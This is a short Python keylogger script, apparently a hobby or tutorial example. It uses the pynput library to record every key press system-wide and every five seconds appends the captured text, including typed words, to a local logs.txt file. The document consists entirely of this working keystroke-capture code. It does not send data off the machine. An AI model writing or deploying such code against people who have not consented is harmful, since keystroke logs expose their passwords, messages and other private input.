# Importing Libraries
import time
import pynput
from pynput.keyboard import Key, Listener

keys = []
startTime = time.time()
elapsedSeconds = 0

def onPress(key):
    global keys, startTime, elapsedSeconds
    k = str(key).replace("'","")
    if k.find("backspace") > 0:
        keys.pop()
    else:
        keys.append(key)

    startTime = time.time()
    elapsedSeconds = 0

def writeToFile(keys):
    with open("logs.txt","a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("enter") > 0:
                file.write('\n')               
            elif k.find("space") > 0:
                file.write(' ')
            elif k.find("Key") == -1:
                file.write(k)

def onRelease(key):
    if key == Key.esc:
        return False

with Listener( on_press = onPress, on_release = onRelease) as listener:
    while elapsedSeconds >= 0:
        elapsedSeconds = time.time() - startTime
        print(elapsedSeconds)
        
        if(elapsedSeconds >= 5):
            startTime = time.time()
            elapsedSeconds = 0
            writeToFile(keys)
            keys = []
            
        time.sleep(1)
        
    listener.join()
